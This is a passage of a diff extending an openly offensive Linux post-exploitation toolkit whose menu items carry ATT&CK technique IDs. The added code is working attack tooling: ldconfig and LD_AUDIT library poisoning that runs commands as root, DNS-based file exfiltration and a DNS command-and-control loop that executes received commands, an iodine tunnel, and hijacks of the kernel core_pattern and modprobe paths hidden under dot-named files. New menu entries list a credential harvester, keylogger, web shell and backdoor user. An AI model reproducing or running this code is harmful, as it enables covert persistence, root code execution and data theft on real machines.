+    echo -e "  ${CYAN}[1]${NC} RPATH exploitation scan"
+    echo -e "  ${CYAN}[2]${NC} ldconfig cache poisoning"
+    echo -e "  ${CYAN}[3]${NC} LD_AUDIT hook"
+    echo -e "  ${CYAN}[4]${NC} Cleanup"
+    read -p "Choice [1]: " OPT; OPT="${OPT:-1}"
+    case "$OPT" in
+        1)
+            command -v readelf &>/dev/null || { echo "readelf needed."; return; }
+            echo -e "${CYAN}[*] Scanning SUID binaries with RPATH...${NC}"
+            find / -perm -4000 -o -perm -2000 2>/dev/null | while read bin; do
+                [[ -f "$bin" ]] || continue
+                rpath=$(readelf -d "$bin" 2>/dev/null | grep -E "RPATH|RUNPATH" | awk -F'[][]' '{print $2}')
+                [[ -n "$rpath" ]] && echo -e "  ${RED}[!] ${bin} → RPATH: ${rpath}${NC}"
+            done
+            ;;
+        2)
+            LIBDIR="${POISON_DIR}/libs"; mkdir -p "$LIBDIR"
+            read -p "Payload command: " CMD
+            cat > "${POISON_DIR}/inject.c" << CEOF
+#include <stdlib.h>
+#include <unistd.h>
+static int done=0;
+__attribute__((constructor)) void init(){if(!done&&getuid()==0){done=1;system("${CMD}");}}
+CEOF
+            gcc -shared -fPIC -o "${LIBDIR}/libsystem_helper.so" "${POISON_DIR}/inject.c" 2>/dev/null
+            echo "${LIBDIR}" > /etc/ld.so.conf.d/d3m0n-libs.conf
+            ldconfig 2>/dev/null
+            echo -e "${GREEN}[+] ldconfig cache poisoned${NC}"
+            ;;
+        3)
+            read -p "Payload command: " CMD
+            cat > "${POISON_DIR}/audit.c" << CEOF
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <link.h>
+static int fired=0;
+unsigned int la_version(unsigned int v){return v;}
+unsigned int la_objopen(struct link_map *m, Lmid_t l, uintptr_t *c){
+    if(!fired){fired=1;system("${CMD}");}return 3;}
+CEOF
+            gcc -shared -fPIC -o "${POISON_DIR}/libaudit.so" "${POISON_DIR}/audit.c" -ldl 2>/dev/null
+            echo -e "${GREEN}[+] LD_AUDIT library: ${POISON_DIR}/libaudit.so${NC}"
+            echo -e "${YELLOW}[*] Use: LD_AUDIT=${POISON_DIR}/libaudit.so <command>${NC}"
+            ;;
+        4)
+            rm -f /etc/ld.so.conf.d/d3m0n-libs.conf; rm -rf "$POISON_DIR"
+            ldconfig 2>/dev/null
+            echo -e "${GREEN}[+] Cleaned${NC}"
+            ;;
+    esac
+}
+
+dnsTunnel(){
+    echo " [*] T1071.004 — DNS Tunneling C2 [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    echo -e "  ${CYAN}[1]${NC} DNS TXT exfiltration"
+    echo -e "  ${CYAN}[2]${NC} Subdomain encoding exfiltration"
+    echo -e "  ${CYAN}[3]${NC} DNS C2 poll loop"
+    echo -e "  ${CYAN}[4]${NC} iodine DNS tunnel"
+    echo -e "  ${CYAN}[5]${NC} Cleanup"
+    read -p "Choice [1]: " OPT; OPT="${OPT:-1}"
+    case "$OPT" in
+        1)
+            read -p "C2 domain: " C2; read -p "Data (or file path): " SRC
+            [[ -f "$SRC" ]] && DATA=$(base64 -w0 "$SRC") || DATA=$(echo -n "$SRC" | base64 -w0)
+            SESS=$(head -c 4 /dev/urandom | xxd -p); total=${#DATA}; CS=60
+            chunks=$(( (total + CS - 1) / CS ))
+            for ((i=0; i<chunks; i++)); do
+                chunk="${DATA:$((i*CS)):CS}"
+                dig +short TXT "${chunk}.${SESS}.${i}.${C2}" 2>/dev/null &
+                (( i % 10 == 0 && i > 0 )) && wait
+            done; wait
+            echo -e "${GREEN}[+] Exfiltrated ${total} bytes via ${chunks} queries${NC}"
+            ;;
+        2)
+            read -p "C2 domain: " C2; read -p "File: " FP
+            [[ ! -f "$FP" ]] && { echo "Not found."; return; }
+            DATA=$(xxd -p "$FP" | tr -d '\n'); SESS=$(head -c 3 /dev/urandom | xxd -p)
+            total=${#DATA}; CS=50; chunks=$(( (total + CS - 1) / CS ))
+            for ((i=0; i<chunks; i++)); do
+                dig +short "${DATA:$((i*CS)):CS}.${SESS}.${i}.${C2}" 2>/dev/null &
+                (( i % 5 == 0 )) && wait
+            done; wait
+            echo -e "${GREEN}[+] Exfiltrated via ${chunks} queries${NC}"
+            ;;
+        3)
+            read -p "C2 domain: " C2; read -p "Poll interval [30]: " INT; INT="${INT:-30}"
+            AGENT=$(hostname | md5sum | cut -c1-8)
+            echo -e "${YELLOW}[*] Polling ${AGENT}.cmd.${C2} every ${INT}s (Ctrl-C to stop)${NC}"
+            while true; do
+                CMD_B64=$(dig +short TXT "${AGENT}.cmd.${C2}" 2>/dev/null | tr -d '"')
+                if [[ -n "$CMD_B64" && "$CMD_B64" != "NXDOMAIN" ]]; then
+                    CMD=$(echo "$CMD_B64" | base64 -d 2>/dev/null)
+                    [[ -n "$CMD" ]] && { echo -e "${GREEN}[+] ${CMD}${NC}"; bash -c "$CMD" 2>&1; }
+                fi
+                read -t "$INT" -p "" < /dev/tty 2>/dev/null || true
+            done
+            ;;
+        4)
+            read -p "Tunnel domain: " TD; read -p "Password: " -s TP; echo ""
+            command -v iodine &>/dev/null || apt install -y iodine 2>/dev/null
+            iodine -f -P "$TP" "$TD" & disown
+            echo -e "${GREEN}[+] iodine tunnel started${NC}"
+            ;;
+        5) pkill -f iodine 2>/dev/null; echo -e "${GREEN}[+] Cleaned${NC}" ;;
+    esac
+}
+
+kernelExploit(){
+    echo " [*] T1546 — Kernel Parameter Abuse [*]"
+    echo ""
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  ${CYAN}[1]${NC} core_pattern pipe execution"
+    echo -e "  ${CYAN}[2]${NC} sysctl.conf persistence"
+    echo -e "  ${CYAN}[3]${NC} modprobe path hijack"
+    echo -e "  ${CYAN}[4]${NC} Cleanup"
+    read -p "Choice [1]: " OPT; OPT="${OPT:-1}"
+    MARKER="d3m0n_kernel"
+    case "$OPT" in
+        1)
+            read -p "Command on crash: " CMD
+            HANDLER="/usr/lib/.d3m0n_core_handler.sh"
+            echo -e "#!/bin/bash\n# ${MARKER}\ncat > /dev/null\n${CMD}" > "$HANDLER"; chmod 755 "$HANDLER"
+            cat /proc/sys/kernel/core_pattern > /var/tmp/.d3m0n_core_orig
+            echo "|${HANDLER} %p %u %g %s %t %h %e" > /proc/sys/kernel/core_pattern
+            echo "kernel.core_pattern = |${HANDLER} %p %u %g %s %t %h %e" >> /etc/sysctl.d/99-d3m0n.conf
+            echo -e "${GREEN}[+] core_pattern set. Trigger: kill -SIGSEGV <pid>${NC}"
+            ;;
+        2)
+            CONF="/etc/sysctl.d/99-d3m0n.conf"
+            cat >> "$CONF" << 'SEOF'
+kernel.printk = 0 0 0 0
+kernel.dmesg_restrict = 1
+net.ipv4.ip_forward = 1
+kernel.kptr_restrict = 2
+kernel.sysrq = 0
+SEOF
+            sysctl --system 2>/dev/null
+            echo -e "${GREEN}[+] Stealth sysctl applied${NC}"
+            ;;
+        3)
+            read -p "Command: " CMD
+            CURRENT=$(cat /proc/sys/kernel/modprobe)
+            FAKE="/usr/lib/.d3m0n_modprobe"
+            echo -e "#!/bin/bash\n# ${MARKER}\n${CMD}\n${CURRENT} \"\$@\"" > "$FAKE"; chmod 755 "$FAKE"
+            echo "$CURRENT" > /var/tmp/.d3m0n_modprobe_orig
+            echo "$FAKE" > /proc/sys/kernel/modprobe
+            echo -e "${GREEN}[+] modprobe hijacked${NC}"
+            ;;
+        4)
+            [[ -f /var/tmp/.d3m0n_core_orig ]] && { cat /var/tmp/.d3m0n_core_orig > /proc/sys/kernel/core_pattern; rm -f /var/tmp/.d3m0n_core_orig; }
+            [[ -f /var/tmp/.d3m0n_modprobe_orig ]] && { cat /var/tmp/.d3m0n_modprobe_orig > /proc/sys/kernel/modprobe; rm -f /var/tmp/.d3m0n_modprobe_orig; }
+            rm -f /etc/sysctl.d/99-d3m0n.conf /usr/lib/.d3m0n_core_handler.sh /usr/lib/.d3m0n_modprobe
+            sysctl --system 2>/dev/null
+            echo -e "${GREEN}[+] Cleaned${NC}"
+            ;;
+    esac
+}
+
+banner() {
+    :
 }
 
 menu() {
@@ -2816,6 +3475,20 @@ menu() {
                                   [37] Rogue Certificate Authority (T1553.004)
                                   [38] Hidden Encrypted Filesystem (T1564.005)
                                   [39] Bootkit / Bootloader Persistence (T1542.003)
+                                  [40] Credential Harvester (T1552)
+                                  [41] Linux Keylogger (T1056.001)
+                                  [42] Web Shell Deployment (T1505.003)
+                                  [43] Phantom User Creation (T1136.001)
+                                  [44] Linux Capabilities Abuse (T1548)
+                                  [45] PATH Variable Hijacking (T1574.007)
+                                  [46] Fileless / Memfd Execution (T1027.011)
+                                  [47] VM / Sandbox Evasion (T1497)
+                                  [48] xattr Data Hiding (T1564.001)
+                                  [49] D-Bus Service Persistence (T1543.002)
+                                  [50] NSS Module Backdoor (T1556)
+                                  [51] Library RPATH/ldconfig Poisoning (T1574.008)
+                                  [52] DNS Tunneling C2 (T1071.004)
+                                  [53] Kernel Parameter Abuse (T1546)
 
     [*] Coming soon others features [*]
 
@@ -2903,6 +3576,34 @@ EOF
         hiddenFS
     elif [ "$MENUINPUT" == "39" ] || [ "$MENUINPUT" == "39" ]; then
         bootkitPersist
+    elif [ "$MENUINPUT" == "40" ] || [ "$MENUINPUT" == "40" ]; then
+        credHarvest
+    elif [ "$MENUINPUT" == "41" ] || [ "$MENUINPUT" == "41" ]; then
+        keylogger
+    elif [ "$MENUINPUT" == "42" ] || [ "$MENUINPUT" == "42" ]; then
+        webShell
+    elif [ "$MENUINPUT" == "43" ] || [ "$MENUINPUT" == "43" ]; then
+        phantomUser
+    elif [ "$MENUINPUT" == "44" ] || [ "$MENUINPUT" == "44" ]; then
+        capsAbuse
+    elif [ "$MENUINPUT" == "45" ] || [ "$MENUINPUT" == "45" ]; then
+        pathHijack
+    elif [ "$MENUINPUT" == "46" ] || [ "$MENUINPUT" == "46" ]; then
+        memfdExec
+    elif [ "$MENUINPUT" == "47" ] || [ "$MENUINPUT" == "47" ]; then
+        vmEvasion
+    elif [ "$MENUINPUT" == "48" ] || [ "$MENUINPUT" == "48" ]; then
+        xattrHide
+    elif [ "$MENUINPUT" == "49" ] || [ "$MENUINPUT" == "49" ]; then
+        dbusPersist
+    elif [ "$MENUINPUT" == "50" ] || [ "$MENUINPUT" == "50" ]; then
+        nssBackdoor
+    elif [ "$MENUINPUT" == "51" ] || [ "$MENUINPUT" == "51" ]; then
+        ldconfigPoison
+    elif [ "$MENUINPUT" == "52" ] || [ "$MENUINPUT" == "52" ]; then
+        dnsTunnel
+    elif [ "$MENUINPUT" == "53" ] || [ "$MENUINPUT" == "53" ]; then
+        kernelExploit
     else 
         echo "This option does not exist"
     fi
